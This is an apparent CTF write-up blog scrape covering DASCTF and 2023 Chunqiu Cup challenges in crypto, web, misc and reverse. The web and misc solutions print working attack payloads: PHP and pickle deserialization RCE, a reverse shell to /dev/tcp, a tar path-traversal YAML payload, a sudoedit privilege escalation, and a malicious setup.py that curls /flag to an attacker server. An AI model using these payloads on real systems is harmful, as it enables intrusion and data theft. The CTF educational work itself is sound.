156879727064293983713540449709354153986555741467040286464656817265584766312996642691830194777204718013294370729900795379967954637233360644687807499775502507899321601376211142933572536311131955278039722631021587570212889988642265055045777870448827343999745781892044969377246509539272350727171791700388478710290244365826497917791913803035343900620641430005143841479362493138179077146820182826098057144121231954895739989984846588790277051812053349488382941698352320246217038444944941841831556417341663611407424355426767987304941762716818718024107781873815837487744195004393262412593608463400216124753724777502286239464pubkey = [18143710780782459577, 54431132342347378731, 163293397027042136193, 489880191081126408579, 1469640573243379225737, 4408921719730137677211, 13226765159190413031633, 39680295477571239094899, 119040886432713717284697, 357122659298141151854091, 1071367977894423455562273, 3214103933683270366686819, 9642311801049811100060457, 28926935403149433300181371, 86780806209448299900544113, 260342418628344899701632339, 781027255885034699104897017, 2343081767655104097314691051, 7029245302965312291944073153, 21087735908895936875832219459, 63263207726687810627496658377, 189789623180063431882489975131, 569368869540190295647469925393, 1708106608620570886942409776179, 601827224419797931380408071500, 1805481673259393794141224214500, 893952418336266652976851386463, 2681857255008799958930554159389, 3523079163584485147344841221130, 1524252287869625983140881149316, 50264262166963219975822190911, 150792786500889659927466572733, 452378359502668979782399718199, 1357135078508006939347199154597, 4071405235524020818041597463791, 3169230503688232995231149877299, 462706308180869526799807117823, 1388118924542608580399421353469, 4164356773627825741198264060407, 3448085117999647764701149667147, 1299270151115113835209806487367, 3897810453345341505629419462101, 2648446157152195057994615872229, 3422845870014670444537026359650, 1223552407160181874717436564876, 3670657221480545624152309694628, 1966986461557807413563286569810, 1378466783231507511243038452393, 4135400349694522533729115357179, 3361215846199738142293703557463, 1038662335715384967987468158315, 3115987007146154903962404474945, 302975818554635252993570910761, 908927455663905758980712732283, 2726782366991717276942138196849, 3657854499533237101379593333510, 1928578295715881845245137486456, 1263242285705730806288591202331, 3789726857117192418865773606993, 2324195368467747797703678306905, 2450093503961328663664213663678, 2827787910442071261545819733997, 3960871129884299055190637944954, 2837628186769067706678271320788]en_e = 31087054322877663244023458448558&#x27;&#x27;&#x27; 根据已知 $p$ 高位，用coppersmith算法恢复 $p$。 对于 $e$，已知 $s_i = w \\cdot 3^i \\bmod m$，已知 $3^i$ 和 $s_i$，未知 $w$ 和 $m$。 由 $\\begin{cases} s_i = w \\cdot 3^i \\bmod m \\newline s_{i+1} = w \\cdot 3^{i+1} \\bmod m \\end{cases}$，即 $\\begin{cases} w \\cdot 3^i = s_i+k_1m \\newline w \\cdot 3^{i+1} = s_{i+1}+k_2m \\end{cases}$， 两式相除，得 $(3s_i-s_{i+1})=(3k_1-k_2)m=km$，故求gcd可得 $m$，再按背包密码求解。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465ph = N = c = pk = [...]ec = PR.&lt;x&gt; = PolynomialRing(Zmod(N))f = ph + xpl = f.small_roots(X=2^435, beta=0.4)[0]p = int(ph+pl)q = N//pm = 0for i in range(len(pk)-1): m = gcd(m, 3*pk[i]-pk[i+1])print(m)w = pk[0]*inverse_mod(3^0,m)%mprint(w)ct = ecn = len(pk)# Sanity check for application of low density attackd = n / log(max(pk), 2)print(CDF(d))assert CDF(d) &lt; 0.9408M = Matrix.identity(n) * 2last_row = [1 for x in pk]M_last_row = Matrix(ZZ, 1, len(last_row), last_row)last_col = pklast_col.append(ct)M_last_col = Matrix(ZZ, len(last_col), 1, last_col)M = M.stack(M_last_row)M = M.augment(M_last_col)X = M.BKZ()sol = []for i in range(n + 1): testrow = X.row(i).list()[:-1] if set(testrow).issubset([-1, 1]): for v in testrow: if v == 1: sol.append(0) elif v == -1: sol.append(1) breaks = sole = int(&#x27;&#x27;.join([str(k) for k in s]),2)print(e)print(e.bit_length())print(is_prime(e))f = (p-1)*(q-1)d = inverse_mod(e,f)m = pow(c,d,N)print(bytes.fromhex(hex(m)[2:]))b&#x27;DASCTF&#123;T81I_tPPS_6r7g_xlPi_OO3M_6vyV_Rkba&#125;&#x27; ​ XOR贯穿始终 一切都是有意义的，拿下它吧。 massege.txt 中为社会价值观编码，解码得压缩包密码：C0ngr4tulati0n5_y0u_fou^d_m3，注释：钥匙先别扔掉，万一后面还有用呢。 task.py： 123456789101112131415161718from gmpy2 import gcdfrom Crypto.Util.number import getPrimefrom secret import enflagp = getPrime(512)q = getPrime(512)n = q * pphi = (p - 1) * (q - 1)e = getPrime(17)assert gcd(e, phi) == 1# 以上信息生成了私钥文件,但文件被损坏了你能提取有用信息吗c = pow(enflag, e, n)print(&#x27;c = &#x27; + str(c))&#x27;&#x27;&#x27;c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818&#x27;&#x27;&#x27; pri.pem： 123456789101112-----BEGIN PRIVATE KEY-----MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBALmtMy+2uH1ZtbILSuiAukFthyQRH5mp7UmLyzZQkdg9zEP9/5tgffikQ7ytx5kHySHnazgAO1sOzmYEN4Axlev6uafiP8B1Eij97v5VkYJ1I9e3mtBNheTbXKoT8op+ASQ1fQaF4A8UzLuWeZeZI8JTH/SH+bolAK3kiZXDFdkTAgMBAAECgYEAl067LaC7Cvs2A5cMPhfYsESvIgcKN1CwW4Sd3u8dSphhgu7TgyzIuvwxbuo2g1BC6WwKhaI6vGN+csfw6nh98GEn/p3D0huNroAYvf/DRRB9UnHdttX7wB+Mv3P0RBDWHgBiCDVvHFuFUV78cIs0tnbnjxjU07aPV2XRC3AfA2ECQQDqWUNPVg3i6vTyHCL7EGkbeUheYpAAfcKCQrxjc5+5X6A+XtgHAA1JHwykPlCpHUOmlA85DJF1ejuoImzlgRLJAkEAytTCnQF+MN2r1gaAUETZyj5qMYT7Th8zKEVVVJjDawLnuX4usJ2FyRnjCkk86U75QSJhw5mMc0QnG25uGz3++w==-----END PRIVATE KEY----- 按照私钥结构，将私钥base64解码转hex分析： 12345678910111213141516171819202122232425262730820277 # 多余部分0201 # 多余部分00300d06092a864886f70d01010105000482 # 多余部分02613082025d # 开始: 长度=0x025d0201 # 版本：长度=0x0100028181 # n：长度=0x8100b9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913 # n0203 # e：长度=0x03010001 # e028181 # d：长度=0x8100974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361 # d0241 # p：长度=0x4100ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9 # p0241 # q：长度=0x4100cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefb # q 解RSA： 123456789101112131415c = 91817924748361493215143897386603397612753451291462468066632608541316135642691873237492166541761504834463859351830616117238028454453831120079998631107520871612398404926417683282285787231775479511469825932022611941912754602165499500350038397852503264709127650106856760043956604644700201911063515109074933378818p = 0x00ea59434f560de2eaf4f21c22fb10691b79485e6290007dc28242bc63739fb95fa03e5ed807000d491f0ca43e50a91d43a6940f390c91757a3ba8226ce58112c9q = 0x00cad4c29d017e30ddabd606805044d9ca3e6a3184fb4e1f332845555498c36b02e7b97e2eb09d85c919e30a493ce94ef9412261c3998c7344271b6e6e1b3dfefbn = 0xb9ad332fb6b87d59b5b20b4ae880ba416d8724111f99a9ed498bcb365091d83dcc43fdff9b607df8a443bcadc79907c921e76b38003b5b0ece660437803195ebfab9a7e23fc0751228fdeefe5591827523d7b79ad04d85e4db5caa13f28a7e0124357d0685e00f14ccbb9679979923c2531ff487f9ba2500ade48995c315d913e = 0x10001print(is_prime(p))print(is_prime(q))f = (p-1)*(q-1)d = 0x974ebb2da0bb0afb3603970c3e17d8b044af22070a3750b05b849ddeef1d4a986182eed3832cc8bafc316eea36835042e96c0a85a23abc637e72c7f0ea787df06127fe9dc3d21b8dae8018bdffc345107d5271ddb6d5fbc01f8cbf73f44410d61e006208356f1c5b85515efc708b34b676e78f18d4d3b68f5765d10b701f0361m = pow(c,d,n)x = bytes.fromhex(hex(m)[2:])print(x)# b&#x27;DASCTF&#123;0e287wQ\\x08R\\x17\\x00FGXYFZ\\x07V\\x03kIUCn\\x02VDg\\x01f\\x0cN&#x27; 结合压缩包注释，将结果与压缩包密码C0ngr4tulati0n5_y0u_fou^d_m3 高位补 \\x00， 右对齐异或得flag：DASCTF&#123;0e2874af5e422482378640e61d919e9a&#125;。 ​ WEBD0n’t pl4y g4m3!!! -FIX 小明不小心沉迷⚪⚪的东西把源码和猫猫搞丢了，请帮他找回来。请访问/p0p.php bp访问 /p0p.php，提示：# ./有hint.zip， 访问 hint.zip ，在线尊嘟假嘟解码，得 flag在/tmp/catcatf1ag.txt。 查看首页发现使用了PHP Development Server，当PHP&lt;=7.4.21时Development Server存在源码泄露漏洞（CNVD-2023-05738），该漏洞源于php cli server begin send static在解析http请求时存在逻辑漏洞，攻击者可利用该漏洞将两个请求拼接至一个http请求中导致服务器将php文件作为静态文件返回。 构造请求走私： 12345GET /p0p.php HTTP/1.1Host: tcp.cloud.dasctf.com:20294GET / HTTP/1.1 拿到 p0p.php 的源码： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;?phpheader(&quot;HTTP/1.1 302 found&quot;);header(&quot;Location:https://passer-by.com/pacman/&quot;);class Pro&#123; private $exp; private $rce2; public function __get($name) &#123; return $this-&gt;$rce2=$this-&gt;exp[$rce2]; &#125; public function __toString() &#123; call_user_func(&#x27;system&#x27;, &quot;cat /flag&quot;); &#125;&#125;class Yang&#123; public function __call($name, $ary) &#123; if ($this-&gt;key === true || $this-&gt;finish1-&gt;name) &#123; if ($this-&gt;finish-&gt;finish) &#123; call_user_func($this-&gt;now[$name], $ary[0]); &#125; &#125; &#125; public function ycb() &#123; $this-&gt;now = 0; return $this-&gt;finish-&gt;finish; &#125; public function __wakeup() &#123; $this-&gt;key = True; &#125;&#125;class Cheng&#123; private $finish; public $name; public function __get($value) &#123; return $this-&gt;$value = $this-&gt;name[$value]; &#125;&#125;class Bei&#123; public function __destruct() &#123; if ($this-&gt;CTF-&gt;ycb()) &#123; $this-&gt;fine-&gt;YCB1($this-&gt;rce, $this-&gt;rce1); &#125; &#125; public function __wakeup() &#123; $this-&gt;key = false; &#125;&#125;function prohib($a)&#123; $filter = &quot;/system|exec|passthru|shell_exec|popen|proc_open|pcntl_exec|eval|flag/i&quot;; return preg_replace($filter,&#x27;&#x27;,$a);&#125;$a = $_POST[&quot;CTF&quot;];if (isset($a))&#123; unserialize(prohib($a));&#125;?&gt;# ./有hint.zip 分析构造反序列化链，由 Bei:__destruct() 开始，调用到 Yang:__call() 中的 call_user_func() 函数RCE： 1234567891011121314151617181920from phpserialize import serializeclass Yang: public_finish=1class Yang: public_finish=Yang()class Yang: public_finish=Yang() public_now=&#123;&#x27;YCB1&#x27;:&#x27;system&#x27;&#125; class Bei: public_CTF=Yang() public_fine=Yang() public_rce=&#x27;cat /tmp/catcatf1ag.txt&#x27;print(serialize(Bei()))# O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;system&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125; 双写system绕过关键词过滤，POST传参： CTF=O:3:&quot;Bei&quot;:3:&#123;s:3:&quot;CTF&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;O:4:&quot;Yang&quot;:1:&#123;s:6:&quot;finish&quot;;i:1;&#125;&#125;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:4:&quot;fine&quot;;O:4:&quot;Yang&quot;:2:&#123;s:6:&quot;finish&quot;;r:3;s:3:&quot;now&quot;;a:1:&#123;s:4:&quot;YCB1&quot;;s:6:&quot;systsystemem&quot;;&#125;&#125;s:3:&quot;rce&quot;;s:23:&quot;cat /tmp/catcatf1ag.txt&quot;;&#125; 得到flag：DASCTF&#123;54675642781313253235583695043371&#125;。 ​ Serpent I have been endeavoring to Reduce my phobia of Serpents by learning more about them. Do not scan, note that there is a www.zip file under the website. 尝试解flask session： flask-unsign --decode --cookie &#39;eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjAsIm5hbWUiOiJHV0hUIiwic2VjcmV0X2tleSI6IkdXSFR4Y3VMeGhWZVFBIn19.ZPLWRw.5YHps4KX1FfZNY5xe9-25Nckl7s&#39; 得：&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 0, &#39;name&#39;: &#39;GWHT&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125; 包含secret_key，修改为：&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;，加密后改cookie： flask-unsign --sign --cookie &quot;&#123;&#39;Attribute&#39;: &#123;&#39;admin&#39;: 1, &#39;name&#39;: &#39;admin&#39;, &#39;secret_key&#39;: &#39;GWHTxcuLxhVeQA&#39;&#125;&#125;&quot; --secret &#39;GWHTxcuLxhVeQA&#39; 得到提示：Hello admin, welcome to /ppppppppppick1e。 访问 ppppppppppick1e 路由，在Header发现：Hint: Source in /src0de，得到源码： 1234567891011121314151617181920212223242526272829303132333435@app.route(&#x27;/src0de&#x27;)def src0de(): f = open(__file__, &#x27;r&#x27;) rsp = f.read() f.close() return rsp[rsp.index(&quot;@app.route(&#x27;/src0de&#x27;)&quot;):]@app.route(&#x27;/ppppppppppick1e&#x27;)def ppppppppppick1e(): try: username = &quot;admin&quot; rsp = make_response(&quot;Hello, %s &quot; % username) rsp.headers[&#x27;hint&#x27;] = &quot;Source in /src0de&quot; pick1e = request.cookies.get(&#x27;pick1e&#x27;) if pick1e is not None: pick1e = base64.b64decode(pick1e) else: return rsp if check(pick1e): pick1e = pickle.loads(pick1e) return &quot;Go for it!!!&quot; else: return &quot;No Way!!!&quot; except Exception as e: error_message = str(e) return error_message return rspclass GWHT(): def __init__(self): passif __name__ == &#x27;__main__&#x27;: app.run(&#x27;0.0.0.0&#x27;, port=80) python反序列化，测试发现禁用R指令，参考这里使用不带R指令的RCE payload： b&#39;\\x80\\x03c__main__\\nGWHT\\n)\\x81&#125;(V__setstate__\\ncos\\nsystem\\nubVbash -c &quot;bash -i &gt;&amp; /dev/tcp/[IP]/[Port] 0&gt;&amp;1&quot;\\nb.&#39; base64编码后给cookie中的 pick1e 赋值，成功反弹shell。 读根目录下flag发现无权限，查看SUID可执行文件： find / -perm -u=s -type f 2&gt;/dev/null， 发现 /usr/bin/python3.8，执行 python3.8 -c &quot;print(open(&#39;/flag&#39;).read())&quot; 读到flag：DASCTF&#123;62339708167284198788958643730094&#125;。 ​ ArkNights Fantasy world full of magic and dream……………. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import uuidfrom flask import *from werkzeug.utils import *app = Flask(__name__)app.config[&#x27;SECRET_KEY&#x27;] =str(uuid.uuid4()).replace(&quot;-&quot;,&quot;*&quot;)+&quot;Boogipopisweak&quot;@app.route(&#x27;/&#x27;)def index(): name=request.args.get(&quot;name&quot;,&quot;name&quot;) m1sery=[request.args.get(&quot;m1sery&quot;,&quot;Doctor.Boogipop&quot;)] if(session.get(&quot;name&quot;)==&quot;Dr.Boog1pop&quot;): blacklist=re.findall(&quot;/ba|sh|\\\\\\\\|\\[|]|#|system|&#x27;|\\&quot;/&quot;, name, re.IGNORECASE) if blacklist: return &quot;bad hacker no way&quot; exec(f&#x27;for [&#123;name&#125;] in [&#123;m1sery&#125;]:print(&quot;strange?&quot;)&#x27;) else: session[&#x27;name&#x27;] = &quot;Doctor&quot; return render_template(&quot;index.html&quot;,name=session.get(&quot;name&quot;))@app.route(&#x27;/read&#x27;)def read(): file = request.args.get(&#x27;file&#x27;) fileblacklist=re.findall(&quot;/flag|fl|ag/&quot;,file, re.IGNORECASE) if fileblacklist: return &quot;bad hacker!&quot; start=request.args.get(&quot;start&quot;,&quot;0&quot;) end=request.args.get(&quot;end&quot;,&quot;0&quot;) if start==&quot;0&quot; and end==&quot;0&quot;: return open(file,&quot;rb&quot;).read() else: start,end=int(start),int(end) f=open(file,&quot;rb&quot;) f.seek(start) data=f.read(end) return data@app.route(&quot;/&lt;path:path&gt;&quot;)def render_page(path): print(os.path.pardir) print(path) if not os.path.exists(&quot;templates/&quot; + path): return &quot;not found&quot;, 404 return render_template(path)if __name__==&#x27;__main__&#x27;: app.run( debug=False, host=&quot;0.0.0.0&quot; ) print(app.config[&#x27;SECRET_KEY&#x27;]) 非预期，利用 read 路由读环境变量文件 /proc/1/environ 文件找到flag：/read?file=/proc/1/environ。 DASFLAG=DASCTF&#123;67528847472042710457227886304140&#125; 预期解应该是分别通过 /proc/self/maps 和 /proc/self/mem 读取堆栈分布和对应位置内存数据拿到SECRET_KEY值，再修改flask session绕黑名单RCE。 ​ ezyaml 简单得yaml 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576# app.pyimport tarfilefrom flask import Flask, render_template, request, redirectfrom hashlib import md5import yamlimport osimport reapp = Flask(__name__)def waf(s): flag = True blacklist = [&#x27;bytes&#x27;,&#x27;eval&#x27;,&#x27;map&#x27;,&#x27;frozenset&#x27;,&#x27;popen&#x27;,&#x27;tuple&#x27;,&#x27;exec&#x27;,&#x27;\\\\&#x27;,&#x27;object&#x27;,&#x27;listitems&#x27;,&#x27;subprocess&#x27;,&#x27;object&#x27;,&#x27;apply&#x27;] for no in blacklist: if no.lower() in str(s).lower(): flag= False print(no) break return flagdef extractFile(filepath, type): extractdir = filepath.split(&#x27;.&#x27;)[0] if not os.path.exists(extractdir): os.makedirs(extractdir) if type == &#x27;tar&#x27;: tf = tarfile.TarFile(filepath) tf.extractall(extractdir) return tf.getnames()@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])def main(): fn = &#x27;uploads/&#x27; + md5().hexdigest() if not os.path.exists(fn): os.makedirs(fn) return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/upload&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def upload(): if request.method == &#x27;GET&#x27;: return redirect(&#x27;/&#x27;) if request.method == &#x27;POST&#x27;: upFile = request.files[&#x27;file&#x27;] print(upFile) if re.search(r&quot;\\.\\.|/&quot;, upFile.filename, re.M|re.I) != None: return &quot;&lt;script&gt;alert(&#x27;Hacker!&#x27;);window.location.href=&#x27;/upload&#x27;&lt;/script&gt;&quot; savePath = f&quot;uploads/&#123;upFile.filename&#125;&quot; print(savePath) upFile.save(savePath) if tarfile.is_tarfile(savePath): zipDatas = extractFile(savePath, &#x27;tar&#x27;) return render_template(&#x27;result.html&#x27;, path=savePath, files=zipDatas) else: return f&quot;&lt;script&gt;alert(&#x27;&#123;upFile.filename&#125; upload successfully&#x27;);history.back(-1);&lt;/script&gt;&quot;@app.route(&#x27;/src&#x27;, methods=[&#x27;GET&#x27;])def src(): if request.args: username = request.args.get(&#x27;username&#x27;) with open(f&#x27;config/&#123;username&#125;.yaml&#x27;, &#x27;rb&#x27;) as f: Config = yaml.load(f.read()) return render_template(&#x27;admin.html&#x27;, username=&quot;admin&quot;, message=&quot;success&quot;) else: return render_template(&#x27;index.html&#x27;)if __name__ == &#x27;__main__&#x27;: app.run(host=&#x27;0.0.0.0&#x27;, port=8000) 开始一个上传点，根据源码知 upload 路由知当上传tar后缀的文件时，回执行解压代码，将文件解压到uploads目录下，利用tar目录穿越漏洞，将文件解压到config目录下，配合下一步 src 路由功能中存在的PyYAML漏洞（CVE-2020-1747），实现RCE。 生成tar文件： 123456789101112131415import tarfileimport iotar = tarfile.TarFile(r&#x27;1.tar&#x27;, &#x27;w&#x27;)info = tarfile.TarInfo(&quot;../../config/my.yaml&quot;)# 反弹shelldeserialization_payload = &quot;&quot;&quot;!!python/object/apply:os.system [&#x27;bash -c &quot;bash -i &gt; /dev/tcp/[IP]/[Port] 0&gt;&amp;1 2&gt;&amp;1&quot;&#x27;]&quot;&quot;&quot;info.size=len(deserialization_payload)info.mode=0o777tar.addfile(info, io.BytesIO(deserialization_payload.encode()))tar.close() 上传，回显解压到 ../../config/my.yaml，my.yaml 已在config目录下，再访问 /src?username=my 反弹shell成功，执行 cat /fllaagg_here 得到flag：DASCTF&#123;13247551631744504376506324559899&#125;。 ​ REVERSECSGO Let’s Go!! go语言程序，找到最后比较的base64密文为： cPQebAcRp+n+ZeP+YePEWfP7bej4YefCYd/7cuP7WfcPb/URYeMRbesObi/= 动调加密函数 fkReverse_() ，在码表变量 fkReverse 处下断点，调试得实际码表： LMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJK base64解密得flag：DASCTF&#123;73913519-A0A6-5575-0F10-DDCBF50FA8CA&#125;。","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2023赛","slug":"2023赛","permalink":"https://lazzzaro.github.io/tags/2023%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"2023年春秋杯网络安全联赛 春季赛","slug":"match-2023年春秋杯网络安全联赛-春季赛","date":"2023-05-19T10:13:55.000Z","updated":"2023-06-04T16:24:22.895Z","comments":true,"path":"2023/05/19/match-2023年春秋杯网络安全联赛-春季赛/","permalink":"https://lazzzaro.github.io/2023/05/19/match-2023%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E8%81%94%E8%B5%9B-%E6%98%A5%E5%AD%A3%E8%B5%9B/","excerpt":"","text":"​ 2023年春秋杯网络安全联赛春季赛，将更加深化人才培养的意义，给予新生代选手更大的舞台，本次比赛特将时长延长至7天，相对于以往的比赛，这是一次前所未有的尝试。同时，赛题难度分布更加合理均衡，题目质量依旧值得让人期待。题目设计涵盖了多个方面的安全技术，赛题考题范围包括Web 漏洞与渗透(Web)，软件逆向 (Reverse Engineering)，二进制漏洞挖掘和利用(PWN)，密码学（crypto），与杂项（Misc）五大类型，且每个方向每天各放一道题目（第七天不放题）。同时我们还加入了彩蛋题目，希望各位参赛选手玩的开心，在比赛中可以有所收获，希望通过春秋杯能够让各位感受到比赛的乐趣以及春秋GAME的用心，欢迎各位师傅前来挑战。为使比赛更纯粹，更公平，更高质量，我们取消了奖金奖励，并配备了五大方向的高质量赛题。没有名利，更加公平，充分考察选手的综合能力。 Rank: 13 MISCsudo 小楠楠是一个热爱技术的小姑娘，最近开始学习Linux系统中的sudo命令，希望能够更好地管理系统。然而，她并不知道在使用sudo时存在着潜在的网络安全隐患，这可能会给系统带来不必要的风险。因此，她决定进一步学习有关网络安全的知识，以更好地保护系统和数据的安全。小楠楠相信，只有不断学习和提高自己的技能，才能成为一名真正的技术专家。 ssh连接上，发现根目录下有flag，但需要root权限，根据题目描述应该为sudo提权，参考 【权限提升】Linux Sudo权限提升漏洞(CVE-2023-22809)。 sudo -l 查看NOPASSWD特殊权限（对应 /etc/sudoer.d 文件）： 12345Matching Defaults entries for xiaonannan on engine-1: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser xiaonannan may run the following commands on engine-1: (ALL : ALL) NOPASSWD: sudoedit /etc/GAMELAB 故 /etc/GAMELAB 有特殊权限，而环境无vim有nano，尝试payload： EDITOR=&quot;nano -- /flag&quot; sudoedit /etc/GAMELAB 即可在nano编辑模式下得到flag。 ​ piphack 可以安装任意包的接口，你会怎么利用呢？ 给了一个可以安装任意包的接口，寻找到pip相关的提权方法：https://www.cnblogs.com/zlgxzswjy/p/10245977.html，参照着FakePip的方法制作 setup.py 并打包成whl文件放到vps上，但怎么试也没成功反弹shell。 尝试出用另一种git方法同样可以从库中拉取恶意脚本读取flag。 在vps上用python搭建服务器：python3 -m http.server 10010 制作恶意脚本： 123import osf = open(&#x27;/flag&#x27;, &#x27;r&#x27;).read()os.system(&#x27;curl http://vps-ip:10010?&#x27;+f) 放到gitee新建的仓库里，再安装任意包的输入出输入：git+https://gitee.com/lazzzaro/test.git 即可运行库里的 setup.py，在vps内可以看到外带的flag： ​ wordle 做题累了，不如跟小楠楠一起来玩一个wordle游戏，边玩边学英文，一举两得。 （纯游戏，通关即拿flag） wordle猜词游戏，6次内猜对一个5字母单词即可拿到flag。送分。 ​ happy2forensics 小楠楠明明看到了flag，怎么打开文件却找不到呢? 查看流量包里http对象，导出 secret.rar，解压出 secret.vhdx，是一个bitlocker加密的磁盘。 根据官方提示捕获源端口为20，目的端口为80的TCP流量，可以获得bitlocker密码： bitlocker 120483-350966-299189-055297-225478-133463-431684-359403 在回收站找到 flag2.zip 但需要密码。 将所有小图片拼接得到 password: 856a-a56b6a705653，解压 flag2.zip 得到 flag2:-919c-a140d7054ac5。 一堆小图片中有一个不一样大小的图片 210-1.png，binwalk分解，分解出的jpg的APP1块里藏有另一个 FFD8 头，提取出新的jpg，得到 flag1:f97d5b05-d312-46ac。 合并，flag：flag&#123;f97d5b05-d312-46ac-919c-a140d7054ac5&#125;。 ​ 盲人隐藏了起来12和34做对比，发现12相比34少了38个字节，对照补充字节打开12.mp4，得到压缩包密码：ChunJiSai7k7kbibi@!。 解压 flag.zip 得到 flag.png，在尾部发现 keyischunqiu123，zsteg查看png图片的lsb，发现在 b1,bgr,lsb,xy 可以直接看到flag： 12345b1,bgr,lsb,xy .. &lt;wbStego size=84, ext=&quot;\\x00fl&quot;, data=&quot;ag&#123;2c8ba89&quot;..., even=false&gt; 00000000: 54 00 00 00 66 6c 61 67 7b 32 63 38 62 61 38 39 |T...flag&#123;2c8ba89| 00000010: 37 2d 30 32 30 35 2d 39 62 66 66 2d 31 32 33 64 |7-0205-9bff-123d| 00000020: 2d 32 38 31 64 31 32 61 32 34 63 33 38 7d ff ff |-281d12a24c38&#125;..| 00000030: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff |................| flag：flag&#123;2c8ba897-0205-9bff-123d-281d12a24c38&#125;。 ​ 58与64 好多文件..得想办法把他们弄在一起 14268个txt文件，每个txt文件内保存的为base58结果，解码后再连接成字符串，多次base64解码即可。 123456789101112131415import base64import base58s = b&#x27;&#x27;for i in range(14268): f = open(f&#x27;tmp/&#123;i&#125;.txt&#x27;,&#x27;r&#x27;).readline().strip() s += base58.b58decode(f)for i in range(20): s = base64.b64decode(s)print(s)# b&#x27;flag&#123;640ce012-3d3a-446d-9d0e-5d2fe840063b&#125;&#x27; ​ CRYPTOcheckin 来签到吧 12345678910111213141516171819202122232425262728293031from Crypto.Util.number import *from secret import flag, x, ydef keygen(nbit): p, q = [getPrime(nbit) for _ in range(2)] return (p, q)p, q = keygen(1024)n = p * qt = len(flag)//2part1 = bytes_to_long(flag[:t])part2 = bytes_to_long(flag[t:])D = 1117x = y = assert x**2 - D * y**2 == 1enc1 = pow(233 * n ** 2 + 1, part1, n ** 3)enc2 = pow(y * n + 1, part2, n ** 3)print(f&#x27;n = &#123;n&#125;&#x27;)print(f&#x27;enc1 = &#123;enc1&#125;&#x27;)print(f&#x27;enc2 = &#123;enc2&#125;&#x27;)&#x27;&#x27;&#x27;n = 14381700422128582509148801752355744589949207890477326887251636389639477554903212313766087310581920423926674144511237847467160303159477932732842314969782540035709454603184976310835433114879043016737665256729350745769071186849072915716081380191025215059636548339167264601163525017898164466972776553148697204889820118261937316228241099344357088387154112255824092894798716597134811437852876763391697588672779069166285303075312833415574850549277205130215394422655325352478386576833373623679069271857652029364332047485797407322257853316210866532938722911480593571175419708834718860211036796987231227104370259051299799633809enc1 = 7213976567554002619445032200800186986758840297933991288547009708561953107405266725278346810536664670987171549114913443730366439254199110599202411546254632702440251000149674899033994570393935743323319736976929843596350656674709510612789987746895513057821629144725499933366382123251520676386059405796801097683107223771674383940907066300331503757142088898427893069444164604408189686282018392714450005250018004986102062209998463347007934222341910941474212611569508001910685822097788669516018081617394144015000387497289693096617795809933540456797387940627782045397249431573540932386564021712811633992948508497879189416719996092292320828635490820907122756459412206735413770335545012892724496210585503157766011075566023635046144730429791359690237088629187946232458937292767085665897489251315749496284368726255508362410603108788759785472319449267909859926786774679533591222665476101832482161295321411313525830843915966136814748249906589458905410141906965538387896747375546846618213595165688661941876715858338407833641907024891922856719044736945863722003318526031957256722493189062624177017279248142024760515092698242159769372410662895078523142768353100643884341413944795392762315999109544070401451